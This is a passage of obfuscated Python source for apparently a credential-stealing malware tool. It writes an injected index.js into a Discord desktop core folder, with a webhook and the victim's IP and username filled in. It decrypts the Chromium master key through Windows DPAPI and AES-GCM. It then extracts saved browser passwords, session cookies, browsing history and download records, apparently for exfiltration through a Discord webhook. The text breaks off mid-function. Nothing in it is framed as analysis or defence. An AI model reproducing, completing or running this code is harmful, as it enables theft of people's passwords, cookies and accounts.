                AACOENQQFKJRPBCHAMBDVFCTUZSKNLKXJFHDLVMOLVUKZQGCWINQOFABJTHNGKAGQVQCKMKWLMOWB, AACOENQQFKJRPBCHAMBDVFCTUZSKNLKXJFHDLVMOLVUKZQGCWINQOFABJTHNGKAGQVQCKMKWLMOWB_file = AACOENQQFKJRPBCHAMBDVFCTUZSKNLKXJFHDLVMOLVUKZQGCWINQOFABJTHNGKAGQVQCKMKWLMOWB_info
                
                GZYFORDMQIDGIBNLSJXRIJJLTRUTYAJBYFTGJDPXEGVFXVJJQKJGUPIPNYKIZXNOJXNLOXIBLHDOKM = AACOENQQFKJRPBCHAMBDVFCTUZSKNLKXJFHDLVMOLVUKZQGCWINQOFABJTHNGKAGQVQCKMKWLMOWB + '\\index.js'
                
                if not os.path.exists(GZYFORDMQIDGIBNLSJXRIJJLTRUTYAJBYFTGJDPXEGVFXVJJQKJGUPIPNYKIZXNOJXNLOXIBLHDOKM):
                    open(GZYFORDMQIDGIBNLSJXRIJJLTRUTYAJBYFTGJDPXEGVFXVJJQKJGUPIPNYKIZXNOJXNLOXIBLHDOKM, 'w').close()

                with open(GZYFORDMQIDGIBNLSJXRIJJLTRUTYAJBYFTGJDPXEGVFXVJJQKJGUPIPNYKIZXNOJXNLOXIBLHDOKM, 'w', encoding='utf-8') as f:
                    f.write((CMCLEBYMWLTHLAKKZOPUAEHQYIQIMJNDCADNVAZMLMQOQTFFUTZQTGCTDUCBKZVKMWZDYQ).replace('discord_desktop_core-1', AACOENQQFKJRPBCHAMBDVFCTUZSKNLKXJFHDLVMOLVUKZQGCWINQOFABJTHNGKAGQVQCKMKWLMOWB_file)
                            .replace(r"%WEBHOOK_HERE%", CSRNJXPULINWNDPMPIZDEVUTAZWWOBQJXEPBRHDBFAGETEBWPMODBBI)
                            .replace(r"%EMBED_COLOR%", str(DAPSMXEDLIKSTFUVWGEPGFEBJXTTEWJJUJETQQTXGTJKZRGEXTXDCIJM))
                            .replace(r"%USERNAME%", DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS)
                            .replace(r"%IP_PUBLIC%", CKAIWASOGZRWBZEYMZLMRMRJOEFWOFXGQJRPRJRLUGCFWMLRCYPFQXYAETTAMVWUXOOPWRJUDYGSGVYRSPPJXR)
                            .replace(r"%EMBED_NAME%", XBPXCQXYOTIABXOITFRXKODCIOGSZIEVUVDQUWPOHYAYXPAECZVFAWADBBUDMXVUTFDCIOTWMAQJDHEEVQPZAPXSWAVCG)
                            .replace(r"%EMBED_ICON%", SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS)
                            .replace(r"%FOOTER_TEXT%", AZAPUOATZPGDQDFGBUKJXQYURDKDMCRZDJOUCYSXGSRXNFWKMWVYXPZTRQAOKNWMAFWDEXJLMAE)
                            .replace(r"%WEBSITE%", YMMLVOYCDVTLQIHDFCYAQWTFEGXSJVKNFMASQKRCZEOSRIBMPYNHVLARFQSPIGAKGWNCDZTYHIJAWUBZM))
                POAFUPESDAJSPWJWOPFZPDNFFUZMVGBXGCAJLGIMHEFBYBANJBNPQUFYGNHROXLRYLFGYMYYEVSLJZYDMJNRHHEFRASEBSDFV(ESSVJUQFLLPSKOYZTOHQDEEBJKIKWZAPVCOKGNHYUAAMMXIBAEKRXACGWNWUTTCCAKWRJQQWZPGPNGLWDTXHLUTMINAAOAFELQHZ)
    IHMBHRNPNUNNUSSQXHOXZCVYMWZWQAEZWTIGPUVDTJNTLXQJZCIILZVYVJHZOLHQRANKWMXHZAUPYLZRAVDQZY()

def ZCISFJWJSTPVORGIGGOQEMGAGVSCJHWWCJRCBCETACSQVPMRCYTDIAYIHNZJWLKFHTSOLIWUUUTFXPE():
    import os
    import io
    import zipfile
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from discord import SyncWebhook, Embed, File
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    MDJSHQNHCJSXUEXKRREUBYJUPHVSDTEKAHPQQGMQBFQKGJMPQVBLSJQEMZFWDUFKLCP = []
    AUMTCJNKWRMOIZBLYBBZSSKOXKDIHHIAFUSREPYKPVXTGEAYWEPMQWXJZELNVOXOSOCZQBLIDASPMDTWPNVFHA = []
    SDFEAHQZYSZXJDMYPVCSSUAKIIOKUDKOBBHJFXGXNBEBBTXZURXAURPRSKHYJQXIMGWZGGMCZBBUFLEDPLYECEFFTJDMXKHKJ = []
    XIFLMWBYCNQKYJFGDWTBFYVLHHKRIYAMLXQWZBOLPHFDISJJESSFAWSYKNQRFHQJGXETHOTBDABLCGWQGY = []
    HNLEJCAQGLZOOEFEJNPVOFKQRXSCSHCJXOPJETCCQBBUKUOLCMMJMRRZOLVFXUVYETYBXQXLSBRPWAOCPPAXPZYTZFROFH = []
    NLEIRVHIYYRIJPCHOKRSJSSLSUHRXTXWPXNWTWMSGENSACVGIOKLIFAIATDPMXNUVGTKWZBZSJE = []

    def EELMGCJPTRRITYQVTSVMBFSDIMWAQVGZFYMMXIAAEMMVORPMTSUQITYANZYCZREQVBQQWLZDCPKCLYAQKFZMGBFLDHEDEI(CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ):
        if not os.path.exists(CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ):
            return None

        try:
            with open(CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ, 'r', encoding='utf-8') as v4r_f:
                TYYQDPRKVQJNHGAOQYMMILALOCCELXLJVZVMXWPZDCSKHBRFULHKNTLTOZJDVJTGVIEIWYPSCAPSKYCARMVVOGSZLOMXXKVZS = json.load(v4r_f)

            RVYPEOMHDVKSPCFUHUMPNSTGHKVWPDJBIBUHWEKUBAKZLTGIIYUAEKI_key = base64.b64decode(TYYQDPRKVQJNHGAOQYMMILALOCCELXLJVZVMXWPZDCSKHBRFULHKNTLTOZJDVJTGVIEIWYPSCAPSKYCARMVVOGSZLOMXXKVZS["os_crypt"]["encrypted_key"])[5:]
            DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD = win32crypt.CryptUnprotectData(RVYPEOMHDVKSPCFUHUMPNSTGHKVWPDJBIBUHWEKUBAKZLTGIIYUAEKI_key, None, None, None, 0)[1]
            return DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD
        except:
            return None

    def JDSWGOMYNPPXYIYLDGQJOADGSDXECKXGSTXSOIZLFOKZKQNMIGSNUMZCUCNQBYNF(HRYSBPJVGJBRFBHTCNAAXOUMRFROXIGCWMLDVTDBJSDAEAXZOPSWYDAKBIHDLKCDBSQWYNTXTP, DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD):
        try:
            HOYQKKTBUZBDPJGTAPSGHZBWOFEQIXWEZJAAPODKNRKEEJVNSHEPEONUHWKWHWNVDLCKHLJPUQYXSFMYNJLHAVMQSGASAKAZDD = HRYSBPJVGJBRFBHTCNAAXOUMRFROXIGCWMLDVTDBJSDAEAXZOPSWYDAKBIHDLKCDBSQWYNTXTP[3:15]
            YZSOMSZSDNMVTVQGRNJEWNRRTFSUJXQTUEVCYFQMNTVGXABCVQCIIZPADUDRKMTHJDSJJPEURVZLFYPCT = HRYSBPJVGJBRFBHTCNAAXOUMRFROXIGCWMLDVTDBJSDAEAXZOPSWYDAKBIHDLKCDBSQWYNTXTP[15:-16]
            GVECRFUEEDNJTHACEWJZEZEKHOWRHXQNDHAFMPBSIOPKMWCBWAQQ = HRYSBPJVGJBRFBHTCNAAXOUMRFROXIGCWMLDVTDBJSDAEAXZOPSWYDAKBIHDLKCDBSQWYNTXTP[-16:]
            VUBJUGEIXGPSTXSFMITQBWHOJZQMPXOJGKNOKMXJTQRVPXJEQIBGXL = Cipher(algorithms.AES(DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD), modes.GCM(HOYQKKTBUZBDPJGTAPSGHZBWOFEQIXWEZJAAPODKNRKEEJVNSHEPEONUHWKWHWNVDLCKHLJPUQYXSFMYNJLHAVMQSGASAKAZDD, GVECRFUEEDNJTHACEWJZEZEKHOWRHXQNDHAFMPBSIOPKMWCBWAQQ))
            UQTLTBEGREXLFUKMHYULAKNOQPZIJQIQFKEKNZYXMPPRZKSRQDTKEPYWHKPVPOQUUZVPFPD = VUBJUGEIXGPSTXSFMITQBWHOJZQMPXOJGKNOKMXJTQRVPXJEQIBGXL.decryptor()
            BEOQQYTRZYZOANPLCPNGWSJSGOWKQPCJNXGHWEWXXRCYPJTSHTNQYRTLCJHZUWLFKZQEWZ = UQTLTBEGREXLFUKMHYULAKNOQPZIJQIQFKEKNZYXMPPRZKSRQDTKEPYWHKPVPOQUUZVPFPD.update(YZSOMSZSDNMVTVQGRNJEWNRRTFSUJXQTUEVCYFQMNTVGXABCVQCIIZPADUDRKMTHJDSJJPEURVZLFYPCT) + UQTLTBEGREXLFUKMHYULAKNOQPZIJQIQFKEKNZYXMPPRZKSRQDTKEPYWHKPVPOQUUZVPFPD.finalize()
            return BEOQQYTRZYZOANPLCPNGWSJSGOWKQPCJNXGHWEWXXRCYPJTSHTNQYRTLCJHZUWLFKZQEWZ.decode()
        except:
            return None
        
    def LPJNUNMCQJKKYDCQRHASEGGOBJZCVNREMSNDAYRYCPAYSYUKIWJIYINJPQXVHPOKZXDATQUDLOCVRQJST(RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU, EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB, DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD):
        GFGIXCVGUGTWPQCVYVJUQXOGHMNMABOUHJSEYDCQSSMTRPHFYRGLEKUNWFDBBNVHJVALQB_db = os.path.join(EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB, 'Login Data')
        if not os.path.exists(GFGIXCVGUGTWPQCVYVJUQXOGHMNMABOUHJSEYDCQSSMTRPHFYRGLEKUNWFDBBNVHJVALQB_db):
            return

        YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(GFGIXCVGUGTWPQCVYVJUQXOGHMNMABOUHJSEYDCQSSMTRPHFYRGLEKUNWFDBBNVHJVALQB_db)
        disk_conn.backup(YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM)
        disk_conn.close()
        PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR = YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM.cursor()
        PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            XEBEAVJMRCLVRZWPRXEDBPHYHXITVJOXGUIFVSEURDDHBVZNQMF =          f"- Url      : {v4r_row[0]}"
            SRPRMAVFVLECUQFUVDIYPLVAZEZFVBDKJXIIBKTZRVYVXIYUUVPYQXYYTQLPLVGDFEVMXPBHECZUQXVOKAZOLLVCCFO =     f"  Username : {v4r_row[1]}"
            GFGIXCVGUGTWPQCVYVJUQXOGHMNMABOUHJSEYDCQSSMTRPHFYRGLEKUNWFDBBNVHJVALQB =     f"  Password : {JDSWGOMYNPPXYIYLDGQJOADGSDXECKXGSTXSOIZLFOKZKQNMIGSNUMZCUCNQBYNF(v4r_row[2], DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD)}"
            RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU_name = f"  Browser  : {RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU}"
            MDJSHQNHCJSXUEXKRREUBYJUPHVSDTEKAHPQQGMQBFQKGJMPQVBLSJQEMZFWDUFKLCP.append(f"{XEBEAVJMRCLVRZWPRXEDBPHYHXITVJOXGUIFVSEURDDHBVZNQMF}\n{SRPRMAVFVLECUQFUVDIYPLVAZEZFVBDKJXIIBKTZRVYVXIYUUVPYQXYYTQLPLVGDFEVMXPBHECZUQXVOKAZOLLVCCFO}\n{GFGIXCVGUGTWPQCVYVJUQXOGHMNMABOUHJSEYDCQSSMTRPHFYRGLEKUNWFDBBNVHJVALQB}\n{RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU_name}\n")

        YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM.close()

    def INCFFJNHKUGEUYHBOFZOHRNJGDFTCOULHYTMKCWZMXDXAFPRZRJCMSJYAAJPODAYOTURMXYBLXXOUKSCKIDZWUZMNTA(RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU, EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB, DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD):
        LASZAXHRAFKODOSSCVWEQEBNMJBUYAQKLRQWCVGGSZLXGANNJZKDPJFXDUVFXRHRLINEGUUSLZEG = os.path.join(EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB, 'Network', 'Cookies')
        if not os.path.exists(LASZAXHRAFKODOSSCVWEQEBNMJBUYAQKLRQWCVGGSZLXGANNJZKDPJFXDUVFXRHRLINEGUUSLZEG):
            return

        YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(LASZAXHRAFKODOSSCVWEQEBNMJBUYAQKLRQWCVGGSZLXGANNJZKDPJFXDUVFXRHRLINEGUUSLZEG)
        disk_conn.backup(YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM)
        disk_conn.close()
        PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR = YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM.cursor()
        PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            XEBEAVJMRCLVRZWPRXEDBPHYHXITVJOXGUIFVSEURDDHBVZNQMF =          f"- Url     : {v4r_row[0]}"
            MFYLCYMPFKXUJRKNLDEDBWJDTPOGHUEDFOLJVTEGRHIODPUUNEJSYZZZLZUYJMVHL =         f"  Name    : {v4r_row[1]}"
            CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ =         f"  Path    : {v4r_row[2]}"
            YOAFRUXYGQMYKHQKDYBCUAALYNAEAXHJARVTLYXSIJCWYQQGLBEESWGZBSAKJBDECSDNOAJVAJFPZWFXJHIRO =       f"  Cookie  : {JDSWGOMYNPPXYIYLDGQJOADGSDXECKXGSTXSOIZLFOKZKQNMIGSNUMZCUCNQBYNF(v4r_row[3], DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD)}"
            SZOSWCLDCWMLROLBDBNOBCUEESXPYWOZNICBLVVZMFEYVJDYNHULZXXAC =       f"  Expire  : {v4r_row[4]}"
            RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU_name = f"  Browser : {RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU}"
            AUMTCJNKWRMOIZBLYBBZSSKOXKDIHHIAFUSREPYKPVXTGEAYWEPMQWXJZELNVOXOSOCZQBLIDASPMDTWPNVFHA.append(f"{XEBEAVJMRCLVRZWPRXEDBPHYHXITVJOXGUIFVSEURDDHBVZNQMF}\n{MFYLCYMPFKXUJRKNLDEDBWJDTPOGHUEDFOLJVTEGRHIODPUUNEJSYZZZLZUYJMVHL}\n{CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ}\n{YOAFRUXYGQMYKHQKDYBCUAALYNAEAXHJARVTLYXSIJCWYQQGLBEESWGZBSAKJBDECSDNOAJVAJFPZWFXJHIRO}\n{SZOSWCLDCWMLROLBDBNOBCUEESXPYWOZNICBLVVZMFEYVJDYNHULZXXAC}\n{RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU_name}\n")

        YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM.close()

    def ZRGPEDFAYGZUIYZFGGLMUVXHXOIFRUMTQUFQYUQNHGIQMRPVPILGLOJQSIOAOPZBPJIRMPEHKMVFQUFMLRZWETAYDZENOESWVJ(RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU, EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB):
        ULDHQFRIDRJUMYOJMNWJGTVBFPJHIXELSZHTQISNCHWGCSZUTGCI = os.path.join(EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB, 'History')
        if not os.path.exists(ULDHQFRIDRJUMYOJMNWJGTVBFPJHIXELSZHTQISNCHWGCSZUTGCI):
            return
        
        YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(ULDHQFRIDRJUMYOJMNWJGTVBFPJHIXELSZHTQISNCHWGCSZUTGCI)
        disk_conn.backup(YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM)
        disk_conn.close()
        PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR = YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM.cursor()
        PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            XEBEAVJMRCLVRZWPRXEDBPHYHXITVJOXGUIFVSEURDDHBVZNQMF =          f"- Url     : {v4r_row[0]}"
            UKLCCBWKMFOBDTMUNIWXKELUQTIWPYZWKMCFSVAWSCCEUNKHQRQGRBQUVZMFKPTHYIEOHWYCULKCOMMKFC =        f"  Title   : {v4r_row[1]}"
            ARCLMEGYEJONVTOWHHQBFASRQPQENJHTGQGKAMKVBZWOTBXRGXLLRDUWWRGZFICVSRITXOCPZZANNUGVMSYHAVW =         f"  Time    : {v4r_row[2]}"
            RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU_name = f"  Browser : {RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU}"
            SDFEAHQZYSZXJDMYPVCSSUAKIIOKUDKOBBHJFXGXNBEBBTXZURXAURPRSKHYJQXIMGWZGGMCZBBUFLEDPLYECEFFTJDMXKHKJ.append(f"{XEBEAVJMRCLVRZWPRXEDBPHYHXITVJOXGUIFVSEURDDHBVZNQMF}\n{UKLCCBWKMFOBDTMUNIWXKELUQTIWPYZWKMCFSVAWSCCEUNKHQRQGRBQUVZMFKPTHYIEOHWYCULKCOMMKFC}\n{ARCLMEGYEJONVTOWHHQBFASRQPQENJHTGQGKAMKVBZWOTBXRGXLLRDUWWRGZFICVSRITXOCPZZANNUGVMSYHAVW}\n{RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU_name}\n")

        YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM.close()

    def MBVEPJMCACPXWABSPMJFWZWZHGLPYIGXCZJHCIKXSCYUSGZGHGKUMIOGWABGGORNSALNJEJWTKFUHTODFJVQTFAKJWUKZRVCX(RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU, EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB):
        RMGICPEMUWNQTGCKJHDEQTYPQAJQCQINJOYKSPBSLGOAAVTYAAYNWELSIMFOZQWVAVWRQKDWUKNSLDDPONLYLDMEZT = os.path.join(EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB, 'History')
        if not os.path.exists(RMGICPEMUWNQTGCKJHDEQTYPQAJQCQINJOYKSPBSLGOAAVTYAAYNWELSIMFOZQWVAVWRQKDWUKNSLDDPONLYLDMEZT):
            return

        YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(RMGICPEMUWNQTGCKJHDEQTYPQAJQCQINJOYKSPBSLGOAAVTYAAYNWELSIMFOZQWVAVWRQKDWUKNSLDDPONLYLDMEZT)
        disk_conn.backup(YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM)
        disk_conn.close()
        PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR = YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM.cursor()
        PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR.execute('SELECT tab_url, target_path FROM downloads')
        for row in PWTNHCOOKUODKDVFKHAUHKLONDXLTPDSWNBYVUVWQYLZNCNWFOIEWUOYAOSVBKQMMYYXTWKZFFRSTJJGPZQICBDQMBNSMBHOTR.fetchall():
            if not row[0] or not row[1]:
                continue
            CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ =         f"- Path    : {row[1]}"
            XEBEAVJMRCLVRZWPRXEDBPHYHXITVJOXGUIFVSEURDDHBVZNQMF =          f"  Url     : {row[0]}"
            RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU_name = f"  Browser : {RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU}"
            XIFLMWBYCNQKYJFGDWTBFYVLHHKRIYAMLXQWZBOLPHFDISJJESSFAWSYKNQRFHQJGXETHOTBDABLCGWQGY.append(f"{CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ}\n{XEBEAVJMRCLVRZWPRXEDBPHYHXITVJOXGUIFVSEURDDHBVZNQMF}\n{RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU_name}\n")

        YTFEQOEXDTNXTWZGKCWTNZCGQHKTXAJEILWBQKMEXJFIGMKHSKUZRKEOJCZJMGBJIBOCMWYHQYDGMKDOOUTQFEKUGYLUOXZFBEKM.close()

    def KLMMSLNCGYQMKBTTLRLLIKHDHNAQLRUTHTZGQACKBASRVGFUSIRJAEKPIPMZMMRDICEBGTACMJMSDHSOMSKJVLMGQZHDD(RJJOTSYFJVULBLOKSFEMAKPSQCBHDFMKUDNEIQGZKJMCLMAVQUKZSNZRPKCCFOPTTSLKOVEWOLKAUMXVYZHSDDXJZMTQECVLSXU, EGGGUPSHISMDIQQQIOFRWXPZVRGYNCXCXRJECLDCAVPYYKYLSWIQXHBRWBLVPBEWDPBDICYLZYFXDJIURXWYYDSIARNB, DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD):
